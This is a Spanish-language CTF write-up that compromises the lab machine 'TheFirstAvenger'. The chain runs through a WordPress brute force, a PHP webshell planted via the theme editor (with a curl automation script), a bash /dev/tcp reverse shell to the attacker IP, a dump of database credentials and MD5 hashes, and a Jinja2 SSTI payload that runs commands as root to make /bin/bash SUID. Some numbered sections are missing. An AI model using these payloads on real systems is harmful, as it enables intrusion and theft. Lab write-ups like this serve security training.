Writeup · CTF

TheFirstAvenger

Resolución paso a paso: de un WordPress en /wp1 a root mediante fuerza bruta, RCE por el editor de temas, credenciales en MySQL, cracking de un hash MD5 y una inyección de plantilla (SSTI) en un servicio Flask interno que corre como root.

IP víctima 192.168.100.78 vhost thefirstavenger.thl 22 · OpenSSH 9.6p1 80 · Apache 2.4.58 Dificultad Fácil
Nota IP: la IP de la máquina cambia según el laboratorio. En este writeup es 192.168.100.78 (el writeup original usaba 192.168.10.180). Sustituye la IP y tu IP de atacante (192.168.100.74) donde corresponda.

00 Preparación del entorno

Dos cosas que hay que dejar listas antes de empezar, porque si no, varios comandos fallan.

Descomprimir rockyou.txt

En Kali, rockyou viene comprimido como .gz. Hydra, John y wpscan necesitan el fichero .txt descomprimido; si no, dan "file not found".

descomprimir rockyou
$ sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz   # -k conserva el .gz
$ ls -la /usr/share/wordlists/rockyou.txt
-rw-r--r-- 1 root root 139921507 ... /usr/share/wordlists/rockyou.txt

Añadir el virtual host a /etc/hosts

La web responde por el dominio thefirstavenger.thl. Hay que resolverlo a la IP de la máquina.

/etc/hosts
$ echo "192.168.100.78 thefirstavenger.thl" | sudo tee -a /etc/hosts

Instalar sshpass (opcional)

Útil para scriptear el acceso SSH no interactivo. Si prefieres, teclea la contraseña a mano con ssh.

sshpass
$ sudo apt-get install -y sshpass

01 Reconocimiento con nmap

Descubrir el host en la red (puede bloquear ICMP, así que escaneamos puertos) y luego versiones/servicios.

descubrir host (sin root)
$ nmap -sT -Pn -p22,80 --open -n 192.168.100.1-254
todos los puertos (SYN, requiere sudo)
$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.78 -oG allPorts
versiones y scripts
$ nmap -sCV -p22,80 192.168.100.78 -oN targeted
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Bienvenido Cibervengador!

Dos puertos: 22 (SSH) y 80 (Apache). La portada no tiene nada útil en el código fuente.

03 Enumerar WordPress

En /wp1 aparece el dominio thefirstavenger.thl y el usuario admin. Enumeración manual rápida:

versión + plugins (manual)
$ curl -s http://thefirstavenger.thl/wp1/ | grep -i generator
<meta name="generator" content="WordPress 6.6.2" />
$ curl -s http://thefirstavenger.thl/wp1/ | sed 's/href=/\n/g;s/src=/\n/g' \
    | grep -oE 'wp-content/plugins/[^"]*' | sort -u
wp-content/plugins/stop-user-enumeration/.../frontend.js?ver=1.6.3
wpscan
$ wpscan --url http://thefirstavenger.thl/wp1/ \
    --enumerate u,vp --plugins-detection aggressive --no-banner

Resultado: WordPress 6.6.2, tema twentytwentyfour, plugin stop-user-enumeration 1.6.3, usuario admin, xmlrpc.php activo.

04 Fuerza bruta al login

El método más fiable es el ataque de contraseña nativo de wpscan (gestiona las cookies de WordPress por ti, vía XML-RPC):

wpscan password attack
$ wpscan --url http://thefirstavenger.thl/wp1/ \
    --usernames admin --passwords /usr/share/wordlists/rockyou.txt
[SUCCESS] - admin / spongebob
Valid Combinations Found:  Username: admin, Password: spongebob
Cuidado con Hydra: la condición S=302 del writeup original no funciona porque Hydra sigue el redirect y nunca "ve" el 302. Usa la condición de fallo F=login_error + la cookie de test de WordPress (el : de la cabecera hay que escaparlo con \:):
hydra (versión que sí funciona)
# La cadena es muy larga: la partimos en dos variables (mismo resultado)
$ FORM='/wp1/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acceder&testcookie=1'
$ COND=':F=login_error:H=Cookie\: wordpress_test_cookie=WP Cookie check'
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt thefirstavenger.thl \
    http-post-form "$FORM$COND" -t 20 -f
CREDS WP admin : spongebob

05 RCE vía editor de temas

Con admin:spongebob entramos al panel (/wp1/wp-admin). En Apariencia → Editor de archivos de temas se edita un tema inactivo (twentytwentythree) e inyectamos un webshell PHP en patterns/hidden-404.php.

A mano (en el navegador)

  • Panel → Apariencia → Editor de archivos de temas → selecciona el tema Twenty Twenty-Three.
  • Abre patterns/hidden-404.php y pega el webshell. Guarda (Actualizar archivo).
webshell PHP a inyectar
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>

Automatizado con curl (login + nonce + update)

script curl
B=http://thefirstavenger.thl/wp1; CJ=cookies.txt
# 1) login (guarda cookies)
curl -s -c $CJ -b "wordpress_test_cookie=WP Cookie check" \
  --data "log=admin&pwd=spongebob&wp-submit=Acceder&testcookie=1" \
  "$B/wp-login.php" -o /dev/null
# 2) sacar el nonce del editor de temas
NONCE=$(curl -s -b $CJ \
  "$B/wp-admin/theme-editor.php?file=patterns%2Fhidden-404.php&theme=twentytwentythree" \
  | grep -oE "name=.nonce. value=.[a-f0-9]+" | grep -oE "[a-f0-9]{8,}" | head -1)
echo "nonce=$NONCE"
# 3) crear el webshell e inyectarlo (POST action=update)
cat > shell.php <<'EOF'
<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>
EOF
curl -s -b $CJ "$B/wp-admin/theme-editor.php" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "_wp_http_referer=/wp1/wp-admin/theme-editor.php" \
  --data-urlencode "newcontent@shell.php" \
  --data-urlencode "action=update" \
  --data-urlencode "file=patterns/hidden-404.php" \
  --data-urlencode "theme=twentytwentythree" \
  --data-urlencode "scrollto=0" -o /dev/null -w "update HTTP %{http_code}\n"

Probar el RCE

webshell ?cmd=id
$ curl "http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentythree/patterns/hidden-404.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Alternativa Metasploit: use exploit/unix/webapp/wp_admin_shell_upload → set RHOSTS thefirstavenger.thl; set TARGETURI /wp1; set USERNAME admin; set PASSWORD spongebob; exploit → meterpreter como www-data.

06 Reverse shell

Levanta el listener en Kali y dispara la shell a través del webshell. En la URL, & va codificado como %26 (curl --data-urlencode lo hace por ti).

listener (Kali)
$ nc -lvnp 443
disparar reverse shell
$ curl -s -G 'http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentythree/patterns/hidden-404.php' \
    --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.100.74/443 0>&1"'

TTY interactiva (tratamiento de la shell)

upgrade de TTY
www-data$ script /dev/null -c bash
# pulsa Ctrl+Z
$ stty raw -echo; fg
$ reset        # responde: xterm
$ export TERM=xterm; export SHELL=bash

Las credenciales de la base de datos están en wp-config.php:

leer wp-config.php
$ grep -E 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST' /var/www/html/wp1/wp-config.php

define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
define( 'DB_HOST', 'localhost' );
enumerar MySQL
$ mysql -u wordpress -p -h localhost
mysql> show databases;        -- information_schema, performance_schema, top_secret, wordpress
mysql> use top_secret; show tables;    -- avengers
mysql> select * from avengers;
6  Steve Rogers  steve  723a44782520fcdfb57daa4eb2af4be5

La tabla avengers tiene hashes MD5. El que nos interesa es el de steve.

11 Servicio interno 7092 + port forwarding

El puerto 7092 es una app Flask (Werkzeug) llamada "Network toolkit" con un formulario de ping (parámetro ip). Reenviamos el puerto a Kali con SSH para trabajarlo cómodamente.

local port forwarding
$ ssh -L 9091:127.0.0.1:7092 steve@192.168.100.78 -N
Si el 8080 está ocupado por otra app local en tu Kali, usa otro puerto local (aquí 9091). También puedes atacar el SSTI directamente desde la sesión SSH con curl http://127.0.0.1:7092/.
identificar el servicio
$ nmap -sCV -p 9091 localhost
9091/tcp open  http  Werkzeug httpd 3.0.1 (Python 3.12.3)   # Flask -> posible SSTI

12 Escalada a root vía SSTI (Jinja2)

El parámetro ip se refleja en una plantilla Jinja2. Confirmamos la inyección con {{7*7}} (el campo devuelve value="49").

probar SSTI
$ curl -s -G 'http://127.0.0.1:9091/' --data-urlencode 'ip={{7*7}}'
<input ... name="ip" value="49" ...>   # 7*7 = 49  → SSTI confirmado

El servicio corre como root. Lo comprobamos ejecutando id con el payload de Jinja2:

SSTI → id
$ curl -s -G 'http://127.0.0.1:9091/' --data-urlencode \
    "ip={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
... value="uid=0(root) gid=0(root) groups=0(root) ...

Darle SUID a /bin/bash

SSTI → chmod u+s /bin/bash
$ curl -s -G 'http://127.0.0.1:9091/' --data-urlencode \
    "ip={{ self.__init__.__globals__.__builtins__.__import__('os').popen('chmod u+s /bin/bash').read() }}"

Convertirse en root (desde la sesión de steve)

bash -p
steve$ ls -la /bin/bash
-rwsr-xr-x 1 root root ... /bin/bash   # ya tiene el bit SUID
steve$ bash -p
bash-5.2# id
uid=1000(steve) ... euid=0(root) ...
bash-5.2# cat /root/root.txt
ROOT FLAG LAZWSPcMckPMzNPtRrVHsDLjw754tT77t9MVuvda
